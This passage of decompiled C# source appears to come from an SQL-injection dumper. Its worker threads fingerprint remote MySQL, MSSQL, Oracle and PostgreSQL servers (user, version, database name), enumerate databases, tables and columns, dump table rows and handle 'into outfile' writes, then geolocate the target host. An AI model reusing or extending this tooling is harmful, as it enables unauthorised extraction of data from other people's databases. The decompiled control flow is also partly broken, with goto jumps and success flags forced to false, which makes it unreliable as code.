                if (this.__TypeGUI == enTypeGUI.Info | this.__TypeGUI == enTypeGUI.Counter)
                {
                    this.UpDateStatus(desc);
                }
                else
                {
                    int num = this.__WorkerResult.RowsAdded;
                    int num2 = 0;
                    if (decimal.Compare(this.numLimitMax, decimal.Zero) > 0)
                    {
                        num2 = Convert.ToInt32(this.numLimitMax);
                    }
                    else
                    {
                        num2 = this.__WorkerResult.AffectedRows;
                    }
                    if (this.DumpWithVariousT())
                    {
                        num2 *= this.__TrajectTotal;
                        num *= this.__TrajectTotal;
                    }
                    string text2 = "";
                    bool flag = Utls.TypeIsOracle(this.__SQLType);
                    if ((num2 != 1000000 & !(flag & this.__TypeGUI == enTypeGUI.DataBases)) && num < num2)
                    {
                        text2 = string.Concat(new string[]
				{
					" of ",
					Conversions.ToString(num2),
					", missed ",
					Conversions.ToString(num2 - num),
					" ",
					text
				});
                    }
                    this.UpDateStatus(string.Concat(new string[]
			        {
				        desc,
				        ", ",
				        text,
				        " added ",
				        Conversions.ToString(num),
				        text2
			        }));
                }
                if (this.__TypeGUI == enTypeGUI.Data | this.__TypeGUI == enTypeGUI.CustomData)
                {
                    this.__CurrDumpGrid = null;
                }
                this.__RunningWorker = false;
                this.__WorkerResult = null;
                this.__SchemaDump = null;
            }
        }

        private int UpdateNodeCount(Schema oT, string sDB, string sTable = "", string sCollumn = "", string sCount1 = "", string sCount2 = "")
        {
            /*if (this.trwSchema.InvokeRequired)
            {
                return Conversions.ToInteger(this.trwSchema.Invoke(new DLUpdateNodeCount(this.UpdateNodeCount), new object[]
		        {
			        oT,
			        sDB,
			        sTable,
			        sCollumn,
			        sCount1,
			        sCount2
		        }));
            }*/
            TreeNode node = this.GetNode(oT, sDB, sTable, sCollumn);
            if (node == null)
            {
                return 0;
            }
            if (oT == Schema.TABLES)
            {
                if (string.IsNullOrEmpty(sCount1))
                {
                    sCount1 = this.NodeGetCount(node.Text, true).ToString();
                    if (sCount1.Equals("-1"))
                    {
                        sCount1 = "?";
                    }
                }
                if (string.IsNullOrEmpty(sCount2))
                {
                    sCount2 = this.NodeGetCount(node.Text, false).ToString();
                    if (sCount2.Equals("-1"))
                    {
                        sCount2 = "?";
                    }
                }
            }
            node.Text = this.NodeFormatCount(node.Text, sCount1, sCount2);
            if (Conversions.ToBoolean(this.GetObjectValue(this.chkAutoScrollTree)))
            {
                node.EnsureVisible();
            }
            return 1;
        }

        public bool WorkedRequestRetryExceeded(byte iValue)
        {
            int num = Conversions.ToInteger(this.GetObjectValue(this.numMaxRetry));
            if ((int)iValue >= num)
            {
                this.__RequestRetryExceeded = true;
            }
            WorkerResult _WorkerResult = this.__WorkerResult;
            lock (_WorkerResult)
            {
                if (this.__WorkerResult.RetryLimit > num)
                {
                    this.__RequestRetryExceeded = true;
                }
            }
            return this.__RequestRetryExceeded;
        }

        private bool WorkedRequestStop()
        {
            BackgroundWorker bckWorker = this.bckWorker;
            bool result = false;
            lock (bckWorker)
            {
                this.bckWorker.ReportProgress(-1, "");
                if (this.bckWorker.CancellationPending)
                {
                    if (this.__ThreadPool != null)
                    {
                        this.__ThreadPool.AbortThreads();
                    }
                    result = true;
                }
            }
            if (this.__ThreadPool != null)
            {
                global::ThreadPool _ThreadPool = this.__ThreadPool;
                lock (_ThreadPool)
                {
                    if (this.__ThreadPool.Status == global::ThreadPool.ThreadStatus.Stopped)
                    {
                        result = true;
                    }
                }
            }
            /*if (this.__ThreadPool != null && this.__Loading.Paused)
            {
                this.__ThreadPool.Paused = true;
                while (this.__Loading.Paused)
                {
                    Thread.Sleep(10);
                    Application.DoEvents();
                }
                this.__ThreadPool.Paused = false;
            }*/
            return result;
        }

        public void WorkerCounterThread(DumpThread t)
        {
            string value = "Empty";
            try
            {
                string text = string.Empty;
                if (t.IndexJob != -1)
                {
                    if (this.__SchemaDump.Item(0).Columns.Count > 0)
                    {
                        text = this.__SchemaDump.Item(0).Columns[t.IndexJob];
                    }
                    else
                    {
                        text = "";
                    }
                }
                else
                {
                    switch (this.__Counter)
                    {
                        case enTypeCount.Tables:
                            text = this.__SchemaDump.Item(0).DataBase;
                            break;
                        case enTypeCount.Columns:
                            text = this.__SchemaDump.Item(0).Table;
                            break;
                    }
                }
                int num = 0;
                switch (this.__Counter)
                {
                    case enTypeCount.DBs:
                        num = this.SQLCount(Schema.DATABASES, "", "", ref value);
                        this.SetObjectValue(this.lblCountBDs, num.ToString());
                        break;
                    case enTypeCount.Tables:
                    case enTypeCount.TablesAll:
                        num = this.SQLCount(Schema.TABLES, text, "", ref value);
                        this.UpdateNodeCount(Schema.DATABASES, text, "", "", num.ToString(), "");
                        break;
                    case enTypeCount.Columns:
                    case enTypeCount.ColumnsAll:
                        num = this.SQLCount(Schema.COLUMNS, this.__SchemaDump.Item(0).DataBase, text, ref value);
                        this.UpdateNodeCount(Schema.TABLES, this.__SchemaDump.Item(0).DataBase, text, "", num.ToString(), "");
                        break;
                    case enTypeCount.Rows:
                    case enTypeCount.RowsAll:
                        if (t.IndexJob != -1)
                        {
                            num = this.SQLCount(Schema.ROWS, this.__SchemaDump.Item(0).DataBase, text, ref value);
                            this.UpdateNodeCount(Schema.TABLES, this.__SchemaDump.Item(0).DataBase, text, "", "", num.ToString());
                        }
                        else
                        {
                            num = this.SQLCount(Schema.ROWS, this.__SchemaDump.Item(0).DataBase, this.__SchemaDump.Item(0).Table, ref value);
                            this.UpdateNodeCount(Schema.TABLES, this.__SchemaDump.Item(0).DataBase, this.__SchemaDump.Item(0).Table, "", "", num.ToString());
                        }
                        break;
                }
                if (t.TotalThreads == 1)
                {
                }
                bool flag = num >= 0;
            }
            catch (Exception expr_241)
            {
                ProjectData.SetProjectError(expr_241);
                Exception ex = expr_241;
                value = "Error: " + ex.ToString();
                bool flag = false;
                ProjectData.ClearProjectError();
            }
            finally
            {
                try
                {
                    WorkerResult _WorkerResult = this.__WorkerResult;
                    lock (_WorkerResult)
                    {
                        bool flag = false;
                        if (flag)
                        {
                            this.__WorkerResult.ThreadSuccess.Add(t.IndexJob, value);
                        }
                        else
                        {
                            this.__WorkerResult.ThreadFailed.Add(t.IndexJob, value);
                            this.__WorkerResult.IndexFailed.Add(t.IndexJob);
                        }
                    }
                    this.__ThreadPool.Close(t.Thread);
                }
                catch (Exception expr_2E5)
                {
                    ProjectData.SetProjectError(expr_2E5);
                    ProjectData.ClearProjectError();
                }
                int num = 0;
                this.__AftectedRows = num;
            }
        }
        
        private void WorkerDumperThread(DumpThread t)
        {
            string value = "Empty";
            string text = "";
            string text2 = "";
            checked
            {
                try
                {
                    Conversions.ToInteger(this.GetObjectValue(this.numSleep));
                    bool flag = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpFieldByField));
                    Conversions.ToBoolean(this.GetObjectValue(this.chkDumpEncodedHex));
                    string text3 = "";
                    List<string> list = new List<string>();
                    flag = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpFieldByField));
                    if (this.__TypeGUI != enTypeGUI.Info & this.__TypeGUI != enTypeGUI.CustomData)
                    {
                        text = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.GetObjectValue(this.chkDumpWhere)), RuntimeHelpers.GetObjectValue(this.GetObjectValue(this.txtSchemaWhere)), ""));
                        text2 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.GetObjectValue(this.chkDumpOrderBy)), RuntimeHelpers.GetObjectValue(this.GetObjectValue(this.txtSchemaOrderBy)), ""));
                        this.QueryFixLines(ref text);
                        this.QueryFixLines(ref text2);
                    }
                    bool flag2 = false;
                    if ((this.__TypeGUI == enTypeGUI.CustomData & Utls.TypeIsMySQL(this.__SQLType)) && (this.__SchemaDump.Item(0).Query.ToLower().Contains("into outfile") | this.__SchemaDump.Item(0).Query.ToLower().Contains("into dumpfile")))
                    {
                        flag2 = true;
                        bool flag3 = this.MySQLIntoOutfile(ref value);
                    }
                    int num = 0;
                    if (flag)
                    {
                        num = Conversions.ToInteger(this.GetObjectValue(this.numFieldByField));
                        if (num > t.Columns.Count)
                        {
                            num = t.Columns.Count;
                        }
                    }
                    if (!flag2)
                    {
                        bool flag3 = false;
                        HttpResponse httpResponse;
                        if (flag & t.Columns.Count > 1)
                        {
                            bool flag4 = false;
                            List<string> list2 = new List<string>();
                            int arg_1C9_0 = 0;
                            int num2 = t.Columns.Count - 1;
                            for (int i = arg_1C9_0; i <= num2; i++)
                            {
                                list2.Add(" ");
                            }
                            int num3 = Conversions.ToInteger(this.GetObjectValue(this.numMaxRetryColumn));
                            int arg_20C_0 = 0;
                            int arg_20A_0 = t.Columns.Count - 1;
                            int num4 = num;
                            int num5 = arg_20A_0;
                            int num6 = arg_20C_0;
                            while ((num4 >> 31 ^ num6) <= (num4 >> 31 ^ num5) && !this.WorkedRequestStop() && !this.WorkedRequestRetryExceeded(0))
                            {
                                if (num6 == 0)
                                {
                                    List<string> _ListEmptyRows = this.__ListEmptyRows;
                                    lock (_ListEmptyRows)
                                    {
                                        if (this.__ListEmptyRows.Count > 0)
                                        {
                                            text3 = this.__ListEmptyRows[this.__ListEmptyRows.Count - 1];
                                            this.__ListEmptyRows.Remove(text3);
                                            goto IL_60D;
                                        }
                                        text3 = "";
                                        goto IL_60D;
                                    }
                                    goto IL_2A9;
                                }
                                goto IL_60D;
                            IL_2F9:
                                Schema arg_322_1 = Schema.ROWS;
                                string arg_322_2 = t.DataBase;
                                string arg_322_3 = t.Table;
                                List<string> list3;
                                List<string> arg_322_4 = list3;
                                int arg_322_5 = t.X;
                                int arg_322_6 = t.Y;
                                string arg_322_7 = text;
                                string arg_322_8 = text2;
                                httpResponse = null;
                                list = this.SQLDump(arg_322_1, arg_322_2, arg_322_3, arg_322_4, arg_322_5, arg_322_6, arg_322_7, arg_322_8, ref value, ref httpResponse, t, num6);
                                if (list.Count != 0 && !string.IsNullOrEmpty(list[0].Trim()))
                                {
                                    flag4 = true;
                                    if (string.IsNullOrEmpty(text3))
                                    {
                                        if (!this.__DumpGridAdded)
                                        {
                                            this.GridAddNew(0);
                                        }
                                        frmDumpGrid _CurrDumpGrid = this.__CurrDumpGrid;
                                        lock (_CurrDumpGrid)
                                        {
                                            text3 = this.__CurrDumpGrid.Add(list2);
                                        }
                                    }
                                    frmDumpGrid _CurrDumpGrid2 = this.__CurrDumpGrid;
                                    lock (_CurrDumpGrid2)
                                    {
                                        string[] array = Strings.Split(list[0], global::Globals.COLLUMNS_SPLIT_STR, -1, CompareMethod.Binary);
                                        int arg_3CA_0 = 0;
                                        int num7 = num - 1;
                                        for (int j = arg_3CA_0; j <= num7; j++)
                                        {
                                            if (j < array.Length)
                                            {
                                                this.__CurrDumpGrid.Update(text3, num6 + j, array[j]);
                                            }
                                        }
                                    }
                                    WorkerResult _WorkerResult = this.__WorkerResult;
                                    lock (_WorkerResult)
                                    {
                                        this.__WorkerResult.RetryLimit = 0;
                                    }
                                    flag3 = true;
                                }
                                else
                                {
                                    int num8 = 0;
                                    num8++;
                                    if (num8 > num3)
                                    {
                                        this.__WorkerResult.DumpFailed.Add(string.Concat(new string[]
								{
									"Dump failed, row index: ",
									Conversions.ToString(t.X),
									", ",
									Conversions.ToString(t.Y),
									", column index: ",
									Conversions.ToString(num6)
								}));
                                    }
                                    else
                                    {
                                        num6--;
                                    }
                                }
                                if (t.TotalThreads == 1)
                                {
                                    if (t.AfectedRows == 1000000)
                                    {
                                        this.UpDateStatus("[" + Strings.FormatNumber(t.IndexJob + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "] Dumper thread, loading please wait..");
                                    }
                                    else if (num == 1)
                                    {
                                        this.UpDateStatus(string.Concat(new string[]
								{
									"[",
									Strings.FormatNumber(t.IndexJob + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
									"/",
									Strings.FormatNumber(t.AfectedRows, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
									"] Dumper thread, loading please wait.. dumping column ",
									Conversions.ToString(num6 + 1),
									" of ",
									Conversions.ToString(t.Columns.Count)
								}));
                                    }
                                    else
                                    {
                                        this.UpDateStatus(string.Concat(new string[]
								{
									"[",
									Strings.FormatNumber(t.IndexJob + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
									"/",
									Strings.FormatNumber(t.AfectedRows, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
									"] Dumper thread, loading please wait.."
								}));
                                    }
                                }
                                num6 += num4;
                                continue;
                            IL_2A9:
                                list3.AddRange(t.Columns);
                                goto IL_2F9;
                            IL_60D:
                                list3 = new List<string>();
                                if (Utls.TypeIsMSSQL(this.__SQLType))
                                {
                                    goto IL_2A9;
                                }
                                int arg_2BF_0 = 0;
                                int num9 = num - 1;
                                for (int k = arg_2BF_0; k <= num9; k++)
                                {
                                    int num10 = num6 + k;
                                    if (num10 < t.Columns.Count)
                                    {
                                        list3.Add(t.Columns[num10]);
                                    }
                                }
                                goto IL_2F9;
                            }
                            if (!flag4)
                            {
                                WorkerResult _WorkerResult2 = this.__WorkerResult;
                                lock (_WorkerResult2)
                                {
                                    WorkerResult _WorkerResult3 = this.__WorkerResult;
                                    _WorkerResult3.RetryLimit++;
                                }
                                this.__WorkerResult.DumpFailed.Add("Dump failed, row index: " + Conversions.ToString(t.X));
                                goto IL_83E;
                            }
                            if (!this.__CurrDumpGrid.RowIsEmpty(text3))
                            {
                                goto IL_83E;
                            }
                            List<string> _ListEmptyRows2 = this.__ListEmptyRows;
                            lock (_ListEmptyRows2)
                            {
                                if (!this.__ListEmptyRows.Contains(text3))
                                {
                                    this.__ListEmptyRows.Add(text3);
                                }
                                goto IL_83E;
                            }
                        }
                        Schema arg_710_1 = Schema.ROWS;
                        string arg_710_2 = t.DataBase;
                        string arg_710_3 = t.Table;
                        List<string> arg_710_4 = t.Columns;
                        int arg_710_5 = t.X;
                        int arg_710_6 = t.Y;
                        string arg_710_7 = text;
                        string arg_710_8 = text2;
                        httpResponse = null;
                        list = this.SQLDump(arg_710_1, arg_710_2, arg_710_3, arg_710_4, arg_710_5, arg_710_6, arg_710_7, arg_710_8, ref value, ref httpResponse, t, -1);
                        if (list.Count == 0)
                        {
                            this.__WorkerResult.DumpFailed.Add("Dump failed, row index: " + Conversions.ToString(t.X));
                            WorkerResult _WorkerResult4 = this.__WorkerResult;
                            lock (_WorkerResult4)
                            {
                                WorkerResult _WorkerResult3 = this.__WorkerResult;
                                _WorkerResult3.RetryLimit++;
                                goto IL_83E;
                            }
                        }
                        try
                        {
                            List<string>.Enumerator enumerator = list.GetEnumerator();
                            while (enumerator.MoveNext())
                            {
                                string current = enumerator.Current;
                                string[] array2 = Strings.Split(current, global::Globals.COLLUMNS_SPLIT_STR, -1, CompareMethod.Binary);
                                if (!this.__DumpGridAdded)
                                {
                                    this.GridAddNew(array2.Length);
                                }
                                List<string> list4 = new List<string>();
                                string[] array3 = array2;
                                for (int l = 0; l < array3.Length; l++)
                                {
                                    string item = array3[l];
                                    list4.Add(item);
                                }
                                this.__CurrDumpGrid.Add(list4);
                            }
                        }
                        finally
                        {
                        }
                        WorkerResult _WorkerResult5 = this.__WorkerResult;
                        lock (_WorkerResult5)
                        {
                            this.__WorkerResult.RetryLimit = 0;
                        }
                        flag3 = true;
                    }
                IL_83E: ;
                }
                catch (Exception expr_843)
                {
                    ProjectData.SetProjectError(expr_843);
                    Exception ex = expr_843;
                    value = "Error: " + ex.ToString();
                    bool flag3 = false;
                    ProjectData.ClearProjectError();
                }
                finally
                {
                    try
                    {
                        bool flag2 = false;
                        if (!flag2)
                        {
                            WorkerResult _WorkerResult6 = this.__WorkerResult;
                            lock (_WorkerResult6)
                            {
                                bool flag3 = false;
                                if (flag3)
                                {
                                    WorkerResult _WorkerResult3 = this.__WorkerResult;
                                    _WorkerResult3.RowsAdded++;
                                    this.__WorkerResult.ThreadSuccess.Add(t.IndexJob, value);
                                }
                                else
                                {
                                    this.__WorkerResult.ThreadFailed.Add(t.IndexJob, value);
                                    this.__WorkerResult.IndexFailed.Add(t.IndexJob);
                                }
                            }
                        }
                        this.__ThreadPool.Close(t.Thread);
                    }
                    catch (Exception expr_905)
                    {
                        ProjectData.SetProjectError(expr_905);
                        ProjectData.ClearProjectError();
                    }
                }
            }
        }

        private void WorkerGetInfoThread(DumpThread t)
        {
            string value = "Empty";
            checked
            {
                /*try
                {*/
                    Conversions.ToInteger(this.GetObjectValue(this.numSleep));
                    bool flag = Conversions.ToBoolean(Operators.OrObject(Operators.AndObject(this.GetObjectValue(this.chkDumpFieldByField), !Utls.TypeIsMSSQL(this.__SQLType)), this.__SQLType == Types.MSSQL_With_Error));
                    bool flag2 = false;
                    string[] array = new string[3];
                    List<string> list = new List<string>();
                    List<string> list2 = new List<string>();
                    List<string> list3 = new List<string>();
                    HttpResponse httpResponse = null;
                    bool flag3 = true;
                    if (true == Utls.TypeIsMySQL(this.__SQLType))
                    {
                        array[0] = "user()";
                        array[1] = "version()";
                        array[2] = "database()";
                    }
                    else if (flag3 == Utls.TypeIsMSSQL(this.__SQLType))
                    {
                        array[0] = "system_user";
                        array[1] = "@@version";
                        array[2] = "DB_NAME()";
                    }
                    else if (flag3 == Utls.TypeIsOracle(this.__SQLType))
                    {
                        array[0] = "(select user from dual)";
                        array[1] = "(select banner from v$version where banner like " + global::Globals.G_Utilities.ConvertTextToSQLChar("%Oracle%", false, "||", "chr") + ")";
                        array[2] = "(select global_name from global_name)";
                        flag = true;
                    }
                    else if (flag3 == Utls.TypeIsPostgreSQL(this.__SQLType))
                    {
                        array[0] = "user";
                        array[1] = "version()";
                        array[2] = "current_database()";
                    }
                    bool flag7 = false;
                    while (true)
                    {
                        bool flag4 = false;
                        if (flag)
                        {
                            int num = 0;
                            while (!this.WorkedRequestStop())
                            {
                                if (this.WorkedRequestRetryExceeded(0))
                                {
                                    break;
                                }
                                list3.Clear();
                                list3.Add(array[num]);
                                string text = "";
                                switch (num)
                                {
                                    case 0:
                                        text = "user";
                                        break;
                                    case 1:
                                        text = "version";
                                        break;
                                    case 2:
                                        text = "database";
                                        break;
                                }
                                this.UpDateStatus(string.Concat(new string[]
						            {
							            "[",
							            Conversions.ToString(num + 1),
							            "/3] Dumper thread, loading please wait.. dumping ",
							            text,
							            ".."
						            }));
                                list = this.SQLDump(Schema.INFO, "", "", list3, t.X, t.Y, "", "", ref value, ref httpResponse, null, -1);
                                if (list.Count == 0)
                                {
                                    if (!flag4 & !flag2)
                                    {
                                        goto IL_27B;
                                    }
                                    WorkerResult _WorkerResult = this.__WorkerResult;
                                    lock (_WorkerResult)
                                    {
                                        WorkerResult _WorkerResult2 = this.__WorkerResult;
                                        _WorkerResult2.RetryLimit++;
                                    }
                                    list2.Add(list3[0]);
                                    this.__WorkerResult.DumpFailed.Add("Dump missed for " + text);
                                }
                                else
                                {
                                    WorkerResult _WorkerResult3 = this.__WorkerResult;
                                    lock (_WorkerResult3)
                                    {
                                        this.__WorkerResult.RetryLimit = 0;
                                    }
                                    list2.Add(list[0]);
                                    flag7 = true;
                                }
                                if (flag2)
                                {
                                    break;
                                }
                                num++;
                                if (num > 2)
                                {
                                    break;
                                }
                            }
                            goto Block_22;
                        }
                        list3.Add(array[0]);
                        list3.Add(array[1]);
                        list3.Add(array[2]);
                        this.UpDateStatus(" dumping server info..");
                        list = this.SQLDump(Schema.INFO, "", "", list3, t.X, t.Y, "", "", ref value, ref httpResponse, null, -1);
                        if (list.Count == 0)
                        {
                            if (!(!flag4 & !flag2))
                            {
                                goto IL_480;
                            }
                        }
                        else
                        {
                            try
                            {
                                List<string>.Enumerator enumerator = list.GetEnumerator();
                                while (enumerator.MoveNext())
                                {
                                    string current = enumerator.Current;
                                    string[] array2 = Strings.Split(current, global::Globals.COLLUMNS_SPLIT_STR, -1, CompareMethod.Binary);
                                    string[] array3 = array2;
                                    for (int i = 0; i < array3.Length; i++)
                                    {
                                        string item = array3[i];
                                        list2.Add(item);
                                    }
                                }
                            }
                            finally
                            {
                            }
                            WorkerResult _WorkerResult4 = this.__WorkerResult;
                            lock (_WorkerResult4)
                            {
                                this.__WorkerResult.RetryLimit = 0;
                            }
                            if (list2.Count == 3)
                            {
                                break;
                            }
                        }
                    IL_27B:
                        if (flag4)
                        {
                            if (flag)
                            {
                                goto IL_78A;
                            }
                            this.SetObjectValue(this.chkDumpFieldByField, true);
                            this.SetObjectValue(this.numFieldByField, 1);
                            flag = true;
                        }
                        else
                        {
                            string text2 = "";
                            if (!this.AutoSetupCollation(ref text2))
                            {
                                goto IL_78C;
                            }
                        }
                        flag4 = true;
                    }
                    goto IL_4DF;
                Block_22:
                    goto IL_4E1;
                IL_480:
                    this.__WorkerResult.DumpFailed.Add("Dump missed, row index: " + Conversions.ToString(t.X));
                    WorkerResult _WorkerResult5 = this.__WorkerResult;
                    lock (_WorkerResult5)
                    {
                        WorkerResult _WorkerResult2 = this.__WorkerResult;
                        _WorkerResult2.RetryLimit++;
                        goto IL_4E1;
                    }
                IL_4DF:
                    flag7 = true;
                IL_4E1:
                    if (flag7)
                    {
                        string sUser = list2[0];
                        string text3 = "";
                        string sDataBase = "";
                        string text4 = "";
                        string text5 = "";
                        string text6 = "";
                        System.Web.UI.WebControls.Image picFLag = null;
                        if (list2.Count > 1)
                        {
                            text3 = list2[1];
                        }
                        if (list2.Count > 2)
                        {
                            sDataBase = list2[2];
                        }
                        if (text3.IndexOf("\n") > 0)
                        {
                            text3 = text3.Split(new char[]
					        {
						        '\n'
					        })[0].Trim();
                        }
                        if (text3.IndexOf("\v\n") > 0)
                        {
                            text3 = text3.Split(new char[]
					        {
						        '\v'
					        })[0].Trim();
                        }
                        if (text3.IndexOf("\r") > 0)
                        {
                            text3 = text3.Split(new char[]
					        {
						        '\r'
					        })[0].Trim();
                        }
                        if (text3.IndexOf("\r\n") > 0)
                        {
                            text3 = text3.Split(new char[]
					        {
						        '\r'
					        })[0].Trim();
                        }
                        if (text3.EndsWith("("))
                        {
                            text3 = text3.Substring(0, text3.Length - 2).Trim();
                        }
                        if (this.__SQLType == Types.PostgreSQL_No_Error | this.__SQLType == Types.PostgreSQL_With_Error)
                        {
                            text3 = text3.Split(new char[]
					        {
						        '-'
					        })[0].Trim();
                        }
                        if (httpResponse != null)
                        {
                            text4 = httpResponse.HTTPResponse.Server;
                            text5 = global::Globals.G_Utilities.HostNameToIP(httpResponse.HTTPResponse.ResponseUri.DnsSafeHost).ToString();
                        }
                        string domainCode = global::Globals.G_Utilities.GetDomainCode(this.__URL);
                        if (global::Globals.G_GEOIP.CountryCodeExist(domainCode))
                        {
                            text6 = "[" + domainCode.ToUpper() + "] " + global::Globals.G_GEOIP.CountryNameByCode(domainCode);
                            //picFLag = global::Globals.G_Main.imgCoutryFlags.Images[domainCode + ".png"];
                            if (!global::Globals.G_GEOIP.LookupCountry(text5).Equals(text6))
                            {
                                text4 = string.Concat(new string[]
						{
							"[",
							domainCode.ToUpper(),
							"] ",
							global::Globals.G_GEOIP.CountryNameByCode(domainCode),
							" - ",
							text4
						});
                            }
                        }
                        else
                        {
                            GeoIP geo = Globals.G_GEOIP;
                            string arg_76E_1 = text5;
                            string text2 = "";
                            geo.Lookup(arg_76E_1, ref text6, ref text2, true);
                        }
                        this.SetInfo(sUser, text4, text3, sDataBase, text5, text6, false);
                    }
                IL_78A:
                IL_78C: ;
               /* }
                catch (Exception expr_78E)
                {
                    ProjectData.SetProjectError(expr_78E);
                    Exception ex = expr_78E;
                    value = "Error: " + ex.ToString();
                    bool flag7 = false;
                    ProjectData.ClearProjectError();
                }
                finally
                {*/
                    /*try
                    {*/
                       // flag7 = false;
                        /*if (flag7)
                        {
                            this.__WorkerResult.ThreadSuccess.Add(t.IndexJob++, value);
                        }
                        else
                        {
                            this.__WorkerResult.ThreadFailed.Add(t.IndexJob++, value);
                        }*/
                        this.__ThreadPool.Close(t.Thread);
                    /*}
                    catch (Exception expr_7F7)
                    {
                        ProjectData.SetProjectError(expr_7F7);
                        ProjectData.ClearProjectError();
                    }*/
                //}
            }
        }

        private void WorkerSchemaThread(DumpThread t)
        {
            string value = "Empty";
            int num4 = 0;

            checked
            {
                try
                {
                    Conversions.ToInteger(this.GetObjectValue(this.numSleep));
                    string text = "";
                    string text2 = "";
                    if (this.__TypeGUI != enTypeGUI.Info & this.__TypeGUI != enTypeGUI.CustomData)
                    {
                        text = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.GetObjectValue(this.chkDumpWhere)), RuntimeHelpers.GetObjectValue(this.GetObjectValue(this.txtSchemaWhere)), ""));
                        text2 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.GetObjectValue(this.chkDumpOrderBy)), RuntimeHelpers.GetObjectValue(this.GetObjectValue(this.txtSchemaOrderBy)), ""));
                        this.QueryFixLines(ref text);
                        this.QueryFixLines(ref text2);
                    }
                    string text3 = "";
                    int num = Conversions.ToInteger(this.GetObjectValue(this.numMaxRetry));
                    bool flag = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpEncodedHex));
                    switch (this.__TypeGUI)
                    {
                        case enTypeGUI.DataBases:
                            text3 = this.BuildTraject(Schema.DATABASES, t.DataBase, t.Table, t.Columns, t.X, t.Y, text, text2, ref value, t, -1);
                            break;
                        case enTypeGUI.Tables:
                            text3 = this.BuildTraject(Schema.TABLES, t.DataBase, t.Table, t.Columns, t.X, t.Y, text, text2, ref value, t, -1);
                            break;
                        case enTypeGUI.Columns:
                            text3 = this.BuildTraject(Schema.COLUMNS, t.DataBase, t.Table, t.Columns, t.X, t.Y, text, text2, ref value, t, -1);
                            break;
                    }
                    string text4;
                    while (true)
                    {
                        HttpResponse httpResponse = null;
                        if (this.WorkedRequestStop())
                        {
                            break;
                        }
                        text4 = this.LoadHTML(ref text3, ref value, ref httpResponse);
                        if (!string.IsNullOrEmpty(text4))
                        {
                            goto IL_1D4;
                        }
                        int num2 = 0;
                        if (num2 >= num)
                        {
                            goto IL_4CD;
                        }
                        num2++;
                    }
                    goto IL_4F0;
                IL_1D4:
                    List<string> list = this.ParseHtmlData(text4, false);
                    if (list.Count != 0)
                    {
                        try
                        {
                            List<string>.Enumerator enumerator = list.GetEnumerator();
                            while (enumerator.MoveNext())
                            {
                                string current = enumerator.Current;
                                bool flag2  = false;
                                if (!flag2)
                                {
                                    flag2 = !string.IsNullOrEmpty(current);
                                }
                            }
                        }
                        finally
                        {
                        }
                        try
                        {
                            List<string>.Enumerator enumerator2 = list.GetEnumerator();
                            while (enumerator2.MoveNext())
                            {
                                string text5 = enumerator2.Current;
                                if (flag & !Versioned.IsNumeric(text5))
                                {
                                    text5 = global::Globals.G_Utilities.ConvertHexToText(text5);
                                }
                                string[] array = Strings.Split(text5, ",", -1, CompareMethod.Binary);
                                int arg_273_0 = 0;
                                int num3 = array.Length - 1;
                                int i;
                                for (i = arg_273_0; i <= num3; i++)
                                {
                                    if (this.__TypeGUI == enTypeGUI.Columns & this.__SQLType == Types.MySQL_No_Error)
                                    {
                                        string[] array2 = array[i].Split(new char[]
								        {
									        ':'
								        });
                                        if (!this.RightSchemaName(array2[0]))
                                        {
                                            break;
                                        }
                                        if (array2[0].Contains(">") | array2[0].Contains("<") | array2[0].Contains("/") | array2[0].Contains(")") | array2[0].Contains("(") | array2[0].Contains("\""))
                                        {
                                            break;
                                        }
                                    }
                                    else if (!this.RightSchemaName(array[i]))
                                    {
                                        break;
                                    }
                                }
                                if (i < array.Length - 1)
                                {
                                    array = (string[])Utils.CopyArray((Array)array, new string[i - 1 + 1]);
                                }
                                switch (this.__TypeGUI)
                                {
                                    case enTypeGUI.DataBases:
                                        {
                                            string[] array3 = array;
                                            for (int j = 0; j < array3.Length; j++)
                                            {
                                                string sName = array3[j];
                                                this.AddDataBase(sName);
                                                num4++;
                                                WorkerResult _WorkerResult = this.__WorkerResult;
                                                _WorkerResult.RowsAdded++;
                                            }
                                            break;
                                        }
                                    case enTypeGUI.Tables:
                                        {
                                            string[] array4 = array;
                                            for (int k = 0; k < array4.Length; k++)
                                            {
                                                string sName2 = array4[k];
                                                this.AddTable(t.DataBase, sName2);
                                                num4++;
                                                WorkerResult _WorkerResult = this.__WorkerResult;
                                                _WorkerResult.RowsAdded++;
                                            }
                                            break;
                                        }
                                    case enTypeGUI.Columns:
                                        if (this.__SQLType == Types.MySQL_With_Error)
                                        {
                                            this.AddColumn(t.DataBase, t.Table, array[0]);
                                            WorkerResult _WorkerResult = this.__WorkerResult;
                                            _WorkerResult.RowsAdded++;
                                        }
                                        else
                                        {
                                            string[] array5 = array;
                                            for (int l = 0; l < array5.Length; l++)
                                            {
                                                string sName3 = array5[l];
                                                this.AddColumn(t.DataBase, t.Table, sName3);
                                                num4++;
                                                WorkerResult _WorkerResult = this.__WorkerResult;
                                                _WorkerResult.RowsAdded++;
                                            }
                                        }
                                        break;
                                }
                            }
                            goto IL_4F0;
                        }
                        finally
                        {
                        }
                    }
                    value = "Data not found (Row Index: " + Conversions.ToString(t.X) + ")";
                    goto IL_4F0;
                IL_4CD:
                    if (string.IsNullOrEmpty(value))
                    {
                        value = "HTTP Timeout (Row Index: " + Conversions.ToString(t.X) + ")";
                    }
                IL_4F0:
                    if (Conversions.ToBoolean(Operators.AndObject(this.GetObjectValue(this.chkAllInOneRequest), this.__SQLType == Types.MySQL_No_Error)))
                    {
                        switch (this.__TypeGUI)
                        {
                            case enTypeGUI.DataBases:
                            case enTypeGUI.Tables:
                            case enTypeGUI.Columns:
                                if (num4 < t.AfectedRows)
                                {
                                   // this.__Loading.SetLoadingType(ProgressBarStyle.Blocks);
                                    List<string> list2 = new List<string>();
                                    int arg_561_0 = num4;
                                    int num5 = t.AfectedRows - 1;
                                    int m = arg_561_0;
                                    while (m <= num5)
                                    {
